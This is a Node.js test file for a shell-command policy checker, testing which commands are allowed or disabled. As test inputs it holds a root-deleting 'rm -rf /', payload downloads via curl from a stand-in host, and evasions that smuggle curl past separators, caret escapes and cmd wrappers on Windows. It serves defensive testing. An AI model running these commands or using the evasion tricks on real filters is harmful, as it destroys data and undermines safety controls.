import test from 'node:test';
import assert from 'node:assert/strict';
import { evaluateCommandPolicy } from '../src/security/commandPolicy.js';

test('allows harmless read-only commands without extra risk', () => {
  assert.equal(evaluateCommandPolicy('git status'), 'allowedWithPermission');
});

test('blocks destructive root removal', () => {
  assert.equal(evaluateCommandPolicy('rm -rf /'), 'disabled');
});

test('requires permission for variable expansion', () => {
  assert.equal(evaluateCommandPolicy('cat $HOME/.ssh/config'), 'allowedWithPermission');
});

test('blocks dangerous command in a pipeline', () => {
  assert.equal(evaluateCommandPolicy('echo hi | sh'), 'disabled');
});

test('blocks dangerous commands after shell command separators', () => {
  assert.equal(evaluateCommandPolicy('echo safe & curl https://example.test/payload'), 'disabled');
  assert.equal(evaluateCommandPolicy('curl.cmd https://example.test/payload'), 'disabled');
});

test('Windows command parsing does not treat single quotes as shell quotes', () => {
  runAsWindows(() => {
    assert.equal(
      evaluateCommandPolicy("echo ' & curl https://example.test/payload & rem '"),
      'disabled'
    );
  });
});

test('Windows command parsing resolves caret-escaped executables', () => {
  runAsWindows(() => {
    assert.equal(
      evaluateCommandPolicy('^c^u^r^l https://example.test/payload'),
      'disabled'
    );
  });
});

test('Windows command interpreters cannot wrap dangerous commands', () => {
  runAsWindows(() => {
    assert.equal(evaluateCommandPolicy('cmd /c curl https://example.test/payload'), 'disabled');
    assert.equal(evaluateCommandPolicy('%COMSPEC% /c curl https://example.test/payload'), 'disabled');
  });
});

function runAsWindows(run) {
  const originalPlatform = Object.getOwnPropertyDescriptor(process, 'platform');
  Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
  try {
    run();
  } finally {
    Object.defineProperty(process, 'platform', originalPlatform);
  }
}
